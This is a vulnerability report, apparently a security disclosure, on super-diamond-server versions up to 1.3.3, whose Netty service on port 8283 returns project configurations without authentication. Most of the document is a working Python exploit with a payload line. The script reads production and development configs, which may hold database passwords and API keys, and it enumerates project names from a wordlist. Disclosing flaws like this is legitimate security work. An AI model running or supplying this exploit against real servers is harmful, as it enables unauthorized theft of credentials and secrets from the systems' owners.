# Super-Diamond Netty Unauthenticated Access Vulnerability Report

## Introduction to Vulnerabilities

The Netty configuration distribution service (port 8283) of super-diamond-server <= 1.3.3 has no authentication mechanism. Attackers can directly obtain the full configuration of any project (including database passwords, API keys, etc.) by sending a TCP request to port 8283 without any credential.

The `DiamondServerHandler.channelRead0()` method directly parses the `projCode` and `profile` parameters from the client TCP connection and calls `configServiceImpl.queryConfigs()` to query and return configuration data without any authentication.

---

## Affected Versions

super-diamond-server <= 1.3.3

## Utilize conditions

- The target is accessible at port 8283 (no authentication required)

---

## Vulnerability Reproduction

**Step 1: Send the following payload**

```
superdiamond={"projCode":"DEMO","profile":"production","modules":"","version":"1.0"}
```

**Step 2: The Python script is as follows: ：The server returns all production configuration data for the DEMO project**

```
#!/usr/bin/env python3
"""
Super-Diamond Netty No-Auth Exploit PoC
Vulnerability: DiamondServerHandler returns project configs without any authentication
Impact: Unauthorized reading of any project's production configuration
CWE: CWE-306 (Missing Authentication for Critical Function)
"""

import socket
import struct
import json
import sys
import time

HOST = "127.0.0.1"
PORT = 8283

def exploit_read_config(proj_code, profile="production", modules=""):
    """
    Fetch configuration data without authentication

    Protocol:
    1. Send: superdiamond={json}\n
    2. Receive: 4-byte big-endian length prefix + config content
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)

    try:
        sock.connect((HOST, PORT))

        payload = json.dumps({
            "projCode": proj_code,
            "profile": profile,
            "modules": modules,
            "version": "1.0"
        })

        msg = f"superdiamond={payload}\r\n"
        print(f"[*] Sent: {msg.strip()}")
        sock.sendall(msg.encode())

        # Read 4-byte big-endian length prefix
        length_bytes = sock.recv(4)
        if not length_bytes:
            print("[!] No length prefix received")
            return None

        length = struct.unpack('>i', length_bytes)[0]
        print(f"[*] Response length: {length} bytes")

        # Read config content
        config_data = b""
        remaining = length
        while remaining > 0:
            chunk = sock.recv(min(remaining, 4096))
            if not chunk:
                break
            config_data += chunk
            remaining -= len(chunk)

        sock.close()
        return config_data.decode('utf-8')

    except Exception as e:
        print(f"[!] Error: {e}")
        sock.close()
        return None

def main():
    print("=" * 60)
    print("Super-Diamond Netty No-Auth Exploit PoC")
    print("CWE-306: DiamondServerHandler returns configs without authentication")
    print("=" * 60)

    # Test 1: Read DEMO project production config
    print("\n[Test 1] Read DEMO production config")
    print("-" * 40)
    config = exploit_read_config("DEMO", "production")
    if config:
        print(f"[+] Config retrieved ({len(config)} bytes):")
        print(config)
    else:
        print("[-] Failed to retrieve config")

    # Test 2: Read DEMO project development config
    print("\n[Test 2] Read DEMO development config")
    print("-" * 40)
    config = exploit_read_config("DEMO", "development")
    if config:
        print(f"[+] Config retrieved ({len(config)} bytes):")
        print(config)
    else:
        print("[-] Failed to retrieve config")

    # Test 3: Try a non-existent project
    print("\n[Test 3] Try non-existent project")
    print("-" * 40)
    config = exploit_read_config("NONEXIST", "production")
    if config and len(config) > 0:
        print(f"[+] Returned data: {config}")
    else:
        print("[-] No data returned (expected)")

    # Test 4: Enumerate common project codes
    print("\n[Test 4] Enumerate common project codes (no auth)")
    print("-" * 40)
    wordlist = ["admin", "api", "gateway", "user", "order", "payment", "app", "web", "crm", "erp"]
    for code in wordlist:
        config = exploit_read_config(code, "production")
        if config and len(config) > 20:
            print(f"[!] Found project '{code}': {len(config)} bytes config leaked")
        elif config:
            print(f"[-] '{code}': empty config")
        else:
            print(f"[-] '{code}': connection failed")
        time.sleep(0.2)

if __name__ == "__main__":
    main()
```

![image-20260804230750693](https://github.com/fangtang7/picx-images-hosting/raw/master/Super-Diamond/image-20260804230750693.icu3e1tyh.webp)



In `DiamondServerHandler.java`, user TCP requests are directly processed without any authentication:

![image-20260804231058084](https://github.com/fangtang7/picx-images-hosting/raw/master/Super-Diamond/image-20260804231058084.8l0sw6b38j.webp)

The `sendMessage` method returns configuration data directly to the attacker:

![image-20260804231146649](https://github.com/fangtang7/picx-images-hosting/raw/master/Super-Diamond/image-20260804231146649.5j4wuyaazp.webp)
